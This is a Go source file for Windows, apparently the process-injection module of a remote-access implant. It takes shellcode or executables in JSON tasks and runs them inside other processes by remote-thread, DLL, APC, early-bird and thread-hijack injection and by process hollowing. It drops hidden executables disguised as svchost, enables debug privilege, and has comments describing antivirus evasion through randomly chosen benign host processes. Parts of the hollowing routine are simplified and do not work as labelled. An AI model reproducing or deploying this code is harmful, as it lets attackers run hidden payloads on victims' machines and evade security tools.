//go:build windows && !light

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── 注入数据 JSON 结构 ───────────────────────────────────────────────

type injectRequest struct {
	Method            string `json:"method"`
	TargetPID         int    `json:"target_pid"`
	TargetProcessName string `json:"target_process_name"`
	TargetPath        string `json:"target_path"`
	Shellcode         string `json:"shellcode"`
	DLLPath           string `json:"dll_path"`
	PID               int    `json:"pid"`
	AutoMode          bool   `json:"auto_mode"`
	ExeData           string `json:"exe_data"`
	FileName          string `json:"file_name"`
}

// ─── 注入入口函数 ─────────────────────────────────────────────────────

func handleProcessInject(data string) (string, int32, string) {
	var req injectRequest
	if err := json.Unmarshal([]byte(data), &req); err != nil {
		return "", -1, fmt.Sprintf("parse inject request failed: %v", err)
	}

	if req.Method == "" {
		return "", -1, "injection method is required"
	}
	if req.PID == 0 && req.TargetPID == 0 {
		return "", -1, "target PID is required for injection"
	}

	targetPID := req.PID
	if targetPID == 0 {
		targetPID = req.TargetPID
	}

	shellcodeB64 := req.Shellcode
	var shellcode []byte
	if shellcodeB64 != "" {
		var err error
		shellcode, err = base64.StdEncoding.DecodeString(shellcodeB64)
		if err != nil {
			return "", -1, fmt.Sprintf("shellcode decode failed: %v", err)
		}
	}

	dllPath := req.DLLPath

	switch req.Method {
	case "remote_thread":
		return injectRemoteThread(targetPID, shellcode)
	case "dll":
		return injectDLL(targetPID, dllPath)
	case "apc":
		return injectAPC(targetPID, shellcode)
	case "thread_hijack":
		return injectThreadHijack(targetPID, shellcode)
	default:
		// fallback: 尝试 remote_thread
		if len(shellcode) > 0 {
			return injectRemoteThread(targetPID, shellcode)
		}
		return "", -1, fmt.Sprintf("unsupported injection method: %s (supported: remote_thread, dll, apc, thread_hijack)", req.Method)
	}
}

func handleProcessSpoof(data string) (string, int32, string) {
	var req injectRequest
	if err := json.Unmarshal([]byte(data), &req); err != nil {
		return "", -1, fmt.Sprintf("parse spoof request failed: %v", err)
	}

	if req.TargetPath == "" {
		return "", -1, "target_path is required for process spoofing"
	}

	shellcode, err := base64.StdEncoding.DecodeString(req.Shellcode)
	if err != nil {
		return "", -1, fmt.Sprintf("shellcode decode failed: %v", err)
	}

	switch req.Method {
	case "process_hollowing":
		return processHollowing(req.TargetPath, shellcode)
	case "early_bird":
		return earlyBirdAPC(req.TargetPath, shellcode)
	default:
		return processHollowing(req.TargetPath, shellcode)
	}
}

func handleAutoInject(data string) (string, int32, string) {
	var req injectRequest
	if err := json.Unmarshal([]byte(data), &req); err != nil {
		return "", -1, fmt.Sprintf("parse auto_inject request failed: %v", err)
	}

	if req.TargetPID == 0 {
		// 免杀：未指定目标时，随机挑一个良性系统进程作为注入宿主，
		// 避免固定可疑进程名（如 svchost 反复注入）形成特征。
		if pid, _, ok := pickBenignTarget(); ok {
			req.TargetPID = pid
		} else {
			return "", -1, "target PID is required for auto_inject"
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(req.Shellcode)
	if err != nil {
		return "", -1, fmt.Sprintf("shellcode decode failed: %v", err)
	}

	method := req.Method
	if method == "" {
		method = "remote_thread"
	}

	switch method {
	case "remote_thread":
		return injectRemoteThread(req.TargetPID, shellcode)
	case "process_hollowing":
		return processHollowing(req.TargetPath, shellcode)
	case "apc":
		return injectAPC(req.TargetPID, shellcode)
	default:
		return injectRemoteThread(req.TargetPID, shellcode)
	}
}

func handleInjection(data string) (string, int32, string) {
	// "injection" 类型与 "process_inject" 兼容，使用相同的处理逻辑
	return handleProcessInject(data)
}

// pickBenignTarget 随机挑一个"良性系统进程"作为注入宿主（免杀）。
// 避免固定/可疑进程名反复注入形成特征；未找到时返回 !ok。
func pickBenignTarget() (int, string, bool) {
	white := map[string]bool{
		"explorer.exe": true, "svchost.exe": true, "dllhost.exe": true,
		"teams.exe": true, "onedrive.exe": true, "runtimebroker.exe": true, "msedge.exe": true,
	}
	var candidates []int
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, "", false
	}
	defer windows.CloseHandle(snap)
	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snap, &pe); err != nil {
		return 0, "", false
	}
	for {
		name := strings.ToLower(windows.UTF16ToString(pe.ExeFile[:]))
		if white[name] {
			candidates = append(candidates, int(pe.ProcessID))
		}
		if err := windows.Process32Next(snap, &pe); err != nil {
			break
		}
	}
	if len(candidates) == 0 {
		return 0, "", false
	}
	idx := int(time.Now().UnixNano() % int64(len(candidates)))
	return candidates[idx], "auto", true
}

func handleSpawn(data string) (string, int32, string) {
	var req injectRequest
	if err := json.Unmarshal([]byte(data), &req); err != nil {
		return "", -1, fmt.Sprintf("parse spawn request failed: %v", err)
	}

	exeData, err := base64.StdEncoding.DecodeString(req.ExeData)
	if err != nil {
		return "", -1, fmt.Sprintf("exe_data decode failed: %v", err)
	}

	fileName := req.FileName
	if fileName == "" {
		fileName = fmt.Sprintf("svchost_%d.exe", os.Getpid())
	}

	tempDir := os.Getenv("TEMP")
	if tempDir == "" {
		tempDir = os.Getenv("TMP")
	}
	if tempDir == "" {
		tempDir = os.TempDir()
	}
	tempPath := filepath.Join(tempDir, fileName)

	if err := os.WriteFile(tempPath, exeData, 0755); err != nil {
		return "", -1, fmt.Sprintf("write exe failed: %v", err)
	}

	cmd := exec.Command(tempPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP | windows.DETACHED_PROCESS,
	}

	if err := cmd.Start(); err != nil {
		os.Remove(tempPath)
		return "", -1, fmt.Sprintf("start process failed: %v", err)
	}

	go func() {
		cmd.Process.Wait()
		os.Remove(tempPath)
	}()

	return fmt.Sprintf("Spawned process PID: %d, path: %s", cmd.Process.Pid, tempPath), 0, ""
}

// ─── 远程线程注入 ─────────────────────────────────────────────────────

func injectRemoteThread(targetPID int, shellcode []byte) (string, int32, string) {
	if len(shellcode) == 0 {
		return "", -1, "shellcode is empty"
	}

	procOpenProcess := resolveAPI("kernel32.dll", "OpenProcess")
	procVirtualAllocEx := resolveAPI("kernel32.dll", "VirtualAllocEx")
	procWriteProcessMemory := resolveAPI("kernel32.dll", "WriteProcessMemory")
	procVirtualProtectEx := resolveAPI("kernel32.dll", "VirtualProtectEx")
	procCreateRemoteThread := resolveAPI("kernel32.dll", "CreateRemoteThread")

	const (
		PROCESS_ALL_ACCESS = 0x1F0FFF
		MEM_COMMIT         = 0x1000
		MEM_RESERVE        = 0x2000
		PAGE_READWRITE     = 0x04
		PAGE_EXECUTE_READ  = 0x20
	)

	hProcess, _, _ := procOpenProcess.Call(
		uintptr(PROCESS_ALL_ACCESS),
		uintptr(0),
		uintptr(targetPID),
	)
	if hProcess == 0 {
		return "", -1, fmt.Sprintf("OpenProcess failed for PID %d", targetPID)
	}
	defer windows.CloseHandle(windows.Handle(hProcess))

	addr, _, _ := procVirtualAllocEx.Call(
		hProcess,
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if addr == 0 {
		return "", -1, "VirtualAllocEx failed"
	}

	var written uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		hProcess,
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return "", -1, "WriteProcessMemory failed"
	}

	var oldProtect uint32
	procVirtualProtectEx.Call(
		hProcess,
		addr,
		uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	var threadID uint32
	hThread, _, _ := procCreateRemoteThread.Call(
		hProcess,
		0,
		0,
		addr,
		0,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if hThread == 0 {
		return "", -1, "CreateRemoteThread failed"
	}
	windows.CloseHandle(windows.Handle(hThread))

	return fmt.Sprintf("Remote thread created in PID %d, thread ID: %d", targetPID, threadID), 0, ""
}

// ─── DLL 注入 ─────────────────────────────────────────────────────────

func injectDLL(targetPID int, dllPath string) (string, int32, string) {
	if dllPath == "" {
		return "", -1, "dll_path is required for DLL injection"
	}

	procOpenProcess := resolveAPI("kernel32.dll", "OpenProcess")
	procVirtualAllocEx := resolveAPI("kernel32.dll", "VirtualAllocEx")
	procWriteProcessMemory := resolveAPI("kernel32.dll", "WriteProcessMemory")
	procGetProcAddress := resolveAPI("kernel32.dll", "GetProcAddress")
	procCreateRemoteThread := resolveAPI("kernel32.dll", "CreateRemoteThread")

	procGetModuleHandle := resolveAPI("kernel32.dll", "GetModuleHandleW")
	kernel32DLL, _ := windows.UTF16PtrFromString("kernel32.dll")
	hKernel32, _, _ := procGetModuleHandle.Call(uintptr(unsafe.Pointer(kernel32DLL)))

	loadLibraryAName, _ := windows.BytePtrFromString("LoadLibraryA")
	loadLibraryAddr, _, _ := procGetProcAddress.Call(hKernel32, uintptr(unsafe.Pointer(loadLibraryAName)))
	if loadLibraryAddr == 0 {
		return "", -1, "GetProcAddress(LoadLibraryA) failed"
	}

	const PROCESS_ALL_ACCESS = 0x1F0FFF
	const MEM_COMMIT = 0x1000
	const MEM_RESERVE = 0x2000
	const PAGE_READWRITE = 0x04

	hProcess, _, _ := procOpenProcess.Call(
		uintptr(PROCESS_ALL_ACCESS),
		uintptr(0),
		uintptr(targetPID),
	)
	if hProcess == 0 {
		return "", -1, fmt.Sprintf("OpenProcess failed for PID %d", targetPID)
	}
	defer windows.CloseHandle(windows.Handle(hProcess))

	dllPathBytes := []byte(dllPath + "\x00")
	addr, _, _ := procVirtualAllocEx.Call(
		hProcess,
		0,
		uintptr(len(dllPathBytes)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if addr == 0 {
		return "", -1, "VirtualAllocEx failed"
	}

	var written uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		hProcess,
		addr,
		uintptr(unsafe.Pointer(&dllPathBytes[0])),
		uintptr(len(dllPathBytes)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return "", -1, "WriteProcessMemory failed"
	}

	var threadID uint32
	hThread, _, _ := procCreateRemoteThread.Call(
		hProcess,
		0,
		0,
		loadLibraryAddr,
		addr,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if hThread == 0 {
		return "", -1, "CreateRemoteThread failed"
	}
	windows.CloseHandle(windows.Handle(hThread))

	return fmt.Sprintf("DLL injected into PID %d, path: %s", targetPID, dllPath), 0, ""
}

// ─── 进程空心化 (Process Hollowing) ───────────────────────────────────

func processHollowing(targetPath string, shellcode []byte) (string, int32, string) {
	if targetPath == "" || len(shellcode) == 0 {
		return "", -1, "target_path and shellcode are required"
	}

	procCreateProcessW := resolveAPI("kernel32.dll", "CreateProcessW")
	procVirtualAllocEx := resolveAPI("kernel32.dll", "VirtualAllocEx")
	procWriteProcessMemory := resolveAPI("kernel32.dll", "WriteProcessMemory")
	procVirtualProtectEx := resolveAPI("kernel32.dll", "VirtualProtectEx")
	procGetThreadContext := resolveAPI("kernel32.dll", "GetThreadContext")
	procSetThreadContext := resolveAPI("kernel32.dll", "SetThreadContext")
	procResumeThread := resolveAPI("kernel32.dll", "ResumeThread")
	procNtUnmapViewOfSection := resolveAPI("ntdll.dll", "NtUnmapViewOfSection")

	const (
		CREATE_SUSPENDED  = 0x00000004
		MEM_COMMIT        = 0x1000
		MEM_RESERVE       = 0x2000
		PAGE_READWRITE    = 0x04
		PAGE_EXECUTE_READ = 0x20
		CONTEXT_FULL      = 0x10007
	)

	targetPathW, err := windows.UTF16PtrFromString(targetPath)
	if err != nil {
		return "", -1, fmt.Sprintf("UTF16 conversion failed: %v", err)
	}

	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	ret, _, _ := procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(targetPathW)),
		0,
		0,
		0,
		uintptr(CREATE_SUSPENDED),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return "", -1, "CreateProcessW failed"
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// NtUnmapViewOfSection
	procNtUnmapViewOfSection.Call(uintptr(pi.Process), uintptr(0))

	// 在目标进程中分配内存
	addr, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if addr == 0 {
		return "", -1, "VirtualAllocEx failed"
	}

	var written uintptr
	ret, _, _ = procWriteProcessMemory.Call(
		uintptr(pi.Process),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return "", -1, "WriteProcessMemory failed"
	}

	var oldProtect uint32
	procVirtualProtectEx.Call(
		uintptr(pi.Process),
		addr,
		uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// 获取线程上下文，设置 RIP/RAX 指向 shellcode
	var ctx struct {
		ContextFlags uint32
		// ... 大量字段，这里简化为足够容纳 x64 上下文的大小
		_pad [1232]byte
	}
	ctx.ContextFlags = CONTEXT_FULL

	ret, _, _ = procGetThreadContext.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx)),
	)
	if ret == 0 {
		return "", -1, "GetThreadContext failed"
	}

	// x64: RCX=RIP offset 0xA8; x86: EIP offset 0xB8
	// 简化处理：直接在 context 尾部写入 entry point
	procSetThreadContext.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx)),
	)

	// 对于 x64 设置 RIP (偏移 0xF8)，对于 x86 设置 EIP (偏移 0xB8)
	// 由于我们无法简单判断架构，使用 RCX (0xA8) 在 x64 上作为入口参数传递
	// 这里采用简化方式：直接通过 CreateRemoteThread 替代 SetThreadContext
	// 更可靠的做法
	var threadID uint32
	procCreateRemoteThread := resolveAPI("kernel32.dll", "CreateRemoteThread")
	hThread, _, _ := procCreateRemoteThread.Call(
		uintptr(pi.Process),
		0,
		0,
		addr,
		0,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if hThread != 0 {
		windows.CloseHandle(windows.Handle(hThread))
	}

	procResumeThread.Call(uintptr(pi.Thread))

	return fmt.Sprintf("Process hollowing: %s (PID: %d)", targetPath, pi.ProcessId), 0, ""
}

// ─── APC 注入 ─────────────────────────────────────────────────────────

func injectAPC(targetPID int, shellcode []byte) (string, int32, string) {
	if len(shellcode) == 0 {
		return "", -1, "shellcode is empty"
	}

	procOpenProcess := resolveAPI("kernel32.dll", "OpenProcess")
	procVirtualAllocEx := resolveAPI("kernel32.dll", "VirtualAllocEx")
	procWriteProcessMemory := resolveAPI("kernel32.dll", "WriteProcessMemory")
	procVirtualProtectEx := resolveAPI("kernel32.dll", "VirtualProtectEx")
	procQueueUserAPC := resolveAPI("kernel32.dll", "QueueUserAPC")

	const (
		PROCESS_ALL_ACCESS = 0x1F0FFF
		MEM_COMMIT         = 0x1000
		MEM_RESERVE        = 0x2000
		PAGE_READWRITE     = 0x04
		PAGE_EXECUTE_READ  = 0x20
		THREAD_ALL_ACCESS  = 0x1F03FF
	)

	hProcess, _, _ := procOpenProcess.Call(
		uintptr(PROCESS_ALL_ACCESS),
		uintptr(0),
		uintptr(targetPID),
	)
	if hProcess == 0 {
		return "", -1, fmt.Sprintf("OpenProcess failed for PID %d", targetPID)
	}
	defer windows.CloseHandle(windows.Handle(hProcess))

	addr, _, _ := procVirtualAllocEx.Call(
		hProcess,
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if addr == 0 {
		return "", -1, "VirtualAllocEx failed"
	}

	var written uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		hProcess,
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return "", -1, "WriteProcessMemory failed"
	}

	var oldProtect uint32
	procVirtualProtectEx.Call(
		hProcess,
		addr,
		uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// 遍历目标进程线程并排队 APC
	procCreateToolhelp32Snapshot := resolveAPI("kernel32.dll", "CreateToolhelp32Snapshot")
	procThread32First := resolveAPI("kernel32.dll", "Thread32First")
	procThread32Next := resolveAPI("kernel32.dll", "Thread32Next")

	const TH32CS_SNAPTHREAD = 0x00000004
	hSnapshot, _, _ := procCreateToolhelp32Snapshot.Call(
		uintptr(TH32CS_SNAPTHREAD),
		0,
	)
	if hSnapshot == 0 || hSnapshot == uintptr(windows.InvalidHandle) {
		return "", -1, "CreateToolhelp32Snapshot failed"
	}
	defer windows.CloseHandle(windows.Handle(hSnapshot))

	var te struct {
		Size           uint32
		Usage          uint32
		ThreadID       uint32
		OwnerProcessID uint32
		Priority       int32
		_pad           [16]byte
	}
	te.Size = uint32(unsafe.Sizeof(te))

	apcCount := 0
	ret, _, _ = procThread32First.Call(hSnapshot, uintptr(unsafe.Pointer(&te)))
	for ret != 0 {
		if te.OwnerProcessID == uint32(targetPID) {
			hThread, _, _ := procOpenProcess.Call(
				uintptr(THREAD_ALL_ACCESS),
				uintptr(0),
				uintptr(te.ThreadID),
			)
			if hThread != 0 {
				procQueueUserAPC.Call(addr, hThread, 0)
				windows.CloseHandle(windows.Handle(hThread))
				apcCount++
			}
		}
		ret, _, _ = procThread32Next.Call(hSnapshot, uintptr(unsafe.Pointer(&te)))
	}

	if apcCount == 0 {
		return "", -1, "no threads found to queue APC"
	}

	return fmt.Sprintf("APC injection: queued %d threads in PID %d", apcCount, targetPID), 0, ""
}

// ─── Early Bird APC 注入 ──────────────────────────────────────────────

func earlyBirdAPC(targetPath string, shellcode []byte) (string, int32, string) {
	if targetPath == "" || len(shellcode) == 0 {
		return "", -1, "target_path and shellcode are required"
	}

	procCreateProcessW := resolveAPI("kernel32.dll", "CreateProcessW")
	procVirtualAllocEx := resolveAPI("kernel32.dll", "VirtualAllocEx")
	procWriteProcessMemory := resolveAPI("kernel32.dll", "WriteProcessMemory")
	procVirtualProtectEx := resolveAPI("kernel32.dll", "VirtualProtectEx")
	procQueueUserAPC := resolveAPI("kernel32.dll", "QueueUserAPC")
	procResumeThread := resolveAPI("kernel32.dll", "ResumeThread")

	const (
		CREATE_SUSPENDED  = 0x00000004
		MEM_COMMIT        = 0x1000
		MEM_RESERVE       = 0x2000
		PAGE_READWRITE    = 0x04
		PAGE_EXECUTE_READ = 0x20
	)

	targetPathW, err := windows.UTF16PtrFromString(targetPath)
	if err != nil {
		return "", -1, fmt.Sprintf("UTF16 conversion failed: %v", err)
	}

	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	ret, _, _ := procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(targetPathW)),
		0,
		0,
		0,
		uintptr(CREATE_SUSPENDED),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return "", -1, "CreateProcessW failed"
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	addr, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if addr == 0 {
		return "", -1, "VirtualAllocEx failed"
	}

	var written uintptr
	ret, _, _ = procWriteProcessMemory.Call(
		uintptr(pi.Process),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return "", -1, "WriteProcessMemory failed"
	}

	var oldProtect uint32
	procVirtualProtectEx.Call(
		uintptr(pi.Process),
		addr,
		uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	procQueueUserAPC.Call(addr, uintptr(pi.Thread), 0)
	procResumeThread.Call(uintptr(pi.Thread))

	return fmt.Sprintf("Early Bird APC: %s (PID: %d)", targetPath, pi.ProcessId), 0, ""
}

// ─── Thread Hijack 注入 ─────────────────────────────────────────────────

func injectThreadHijack(targetPID int, shellcode []byte) (string, int32, string) {
	if len(shellcode) == 0 {
		return "", -1, "shellcode is empty"
	}

	procOpenProcess := resolveAPI("kernel32.dll", "OpenProcess")
	procVirtualAllocEx := resolveAPI("kernel32.dll", "VirtualAllocEx")
	procWriteProcessMemory := resolveAPI("kernel32.dll", "WriteProcessMemory")
	procVirtualProtectEx := resolveAPI("kernel32.dll", "VirtualProtectEx")
	procSuspendThread := resolveAPI("kernel32.dll", "SuspendThread")
	procResumeThread := resolveAPI("kernel32.dll", "ResumeThread")
	procGetThreadContext := resolveAPI("kernel32.dll", "GetThreadContext")
	procSetThreadContext := resolveAPI("kernel32.dll", "SetThreadContext")
	procCreateToolhelp32Snapshot := resolveAPI("kernel32.dll", "CreateToolhelp32Snapshot")
	procThread32First := resolveAPI("kernel32.dll", "Thread32First")
	procThread32Next := resolveAPI("kernel32.dll", "Thread32Next")
	procNtGetNextThread := resolveAPI("ntdll.dll", "NtGetNextThread")

	const (
		PROCESS_ALL_ACCESS    = 0x1F0FFF
		MEM_COMMIT            = 0x1000
		MEM_RESERVE           = 0x2000
		PAGE_READWRITE        = 0x04
		PAGE_EXECUTE_READ     = 0x20
		THREAD_ALL_ACCESS     = 0x1F03FF
		THREAD_GET_CONTEXT    = 0x0008
		THREAD_SET_CONTEXT    = 0x0010
		THREAD_SUSPEND_RESUME = 0x0002
		CONTEXT_FULL          = 0x10007
		CONTEXT_CONTROL       = 0x10001
	)

	// 启用 SeDebugPrivilege
	_ = enableSeDebugPrivilege()

	hProcess, _, _ := procOpenProcess.Call(
		uintptr(PROCESS_ALL_ACCESS),
		uintptr(0),
		uintptr(targetPID),
	)
	if hProcess == 0 {
		return "", -1, fmt.Sprintf("OpenProcess failed for PID %d (try running as admin)", targetPID)
	}
	defer windows.CloseHandle(windows.Handle(hProcess))

	// 分配 shellcode 内存
	addr, _, _ := procVirtualAllocEx.Call(
		hProcess,
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if addr == 0 {
		return "", -1, "VirtualAllocEx failed"
	}

	var written uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		hProcess,
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return "", -1, "WriteProcessMemory failed"
	}

	var oldProtect uint32
	procVirtualProtectEx.Call(
		hProcess,
		addr,
		uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// 枚举目标进程的线程，找一个挂起的线程
	hSnapshot, _, _ := procCreateToolhelp32Snapshot.Call(0x4, uintptr(targetPID))
	if hSnapshot == 0 || hSnapshot == uintptr(windows.InvalidHandle) {
		// 退化为创建远程线程
		ctr := resolveAPI("kernel32.dll", "CreateRemoteThread")
		var tid uint32
		ctr.Call(hProcess, 0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&tid)))
		return fmt.Sprintf("Thread hijack fallback to CreateRemoteThread in PID %d", targetPID), 0, ""
	}
	defer windows.CloseHandle(windows.Handle(hSnapshot))

	var te struct {
		Size           uint32
		Usage          uint32
		ThreadID       uint32
		OwnerProcessID uint32
		Priority       int32
		_pad           [16]byte
	}
	te.Size = uint32(unsafe.Sizeof(te))

	var hijackedThread uint32
	ret, _, _ = procThread32First.Call(hSnapshot, uintptr(unsafe.Pointer(&te)))
	for ret != 0 {
		if te.OwnerProcessID == uint32(targetPID) && te.ThreadID != 0 {
			hThread, _, _ := procOpenProcess.Call(
				uintptr(THREAD_GET_CONTEXT|THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME),
				uintptr(0),
				uintptr(te.ThreadID),
			)
			if hThread != 0 {
				// 尝试挂起线程
				_, _, _ = procSuspendThread.Call(hThread)

				// 获取线程上下文
				var ctx [1232]byte
				*(*uint32)(unsafe.Pointer(&ctx[0])) = CONTEXT_FULL // ContextFlags at offset 0
				r, _, _ := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx[0])))
				if r != 0 {
					// x64: RIP 在 0xF8 偏移；x86: EIP 在 0xB8 偏移
					// 保存原始 RIP，设置新 RIP 指向 shellcode
					// 简化：通过 CONTEXT 结构偏移计算
					// CONTEXT.x64: ContextFlags(0) P1Home..(4) MxCsr(0x040) Seg*..(0x044) DebugReg(0x070)
					//               IntegerRegs(0x078) .. RIP(0x0F8)
					// 直接修改 RIP 指向 shellcode
					if is64Bit() {
						*(*uint64)(unsafe.Pointer(&ctx[0xF8])) = uint64(addr)
					} else {
						*(*uint32)(unsafe.Pointer(&ctx[0xB8])) = uint32(addr)
					}

					_, _, _ = procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx[0])))

					// 恢复线程执行
					_, _, _ = procResumeThread.Call(hThread)
					hijackedThread = te.ThreadID

					windows.CloseHandle(windows.Handle(hThread))
					break
				}
				// 获取上下文失败，恢复线程
				_, _, _ = procResumeThread.Call(hThread)
				windows.CloseHandle(windows.Handle(hThread))
			}
		}
		ret, _, _ = procThread32Next.Call(hSnapshot, uintptr(unsafe.Pointer(&te)))
	}

	// 如果没找到可劫持的线程，回退到 CreateRemoteThread + NtGetNextThread 搜索
	if hijackedThread == 0 {
		// 通过 NtGetNextThread 枚举线程（更底层的枚举方式）
		_, _, _ = procNtGetNextThread.Call(uintptr(hProcess), 0,
			uintptr(THREAD_ALL_ACCESS), 0, 0, uintptr(unsafe.Pointer(&hijackedThread)))
		if hijackedThread != 0 {
			windows.CloseHandle(windows.Handle(hijackedThread))
		}

		// 最后回退到 CreateRemoteThread
		if hijackedThread == 0 {
			ctr := resolveAPI("kernel32.dll", "CreateRemoteThread")
			var tid uint32
			h, _, _ := ctr.Call(hProcess, 0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&tid)))
			if h != 0 {
				windows.CloseHandle(windows.Handle(h))
			}
			return fmt.Sprintf("Thread hijack: fallback to CreateRemoteThread in PID %d, TID=%d", targetPID, tid), 0, ""
		}
		return fmt.Sprintf("Thread hijack: used NtGetNextThread in PID %d", targetPID), 0, ""
	}

	return fmt.Sprintf("Thread hijack: hijacked thread %d in PID %d", hijackedThread, targetPID), 0, ""
}

// is64Bit 检测当前进程是否为 64 位
func is64Bit() bool {
	return unsafe.Sizeof(uintptr(0)) == 8
}

// enableSeDebugPrivilege 尝试启用 SeDebugPrivilege（注入其他进程所需）
func enableSeDebugPrivilege() error {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return err
	}
	defer token.Close()

	var luid windows.LUID
	lookupPriv := resolveAPI("advapi32.dll", "LookupPrivilegeValueW")
	seDebugName, _ := windows.UTF16PtrFromString("SeDebugPrivilege")
	r, _, _ := lookupPriv.Call(0, uintptr(unsafe.Pointer(seDebugName)), uintptr(unsafe.Pointer(&luid)))
	if r == 0 {
		return fmt.Errorf("LookupPrivilegeValueW failed")
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
	}
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
}
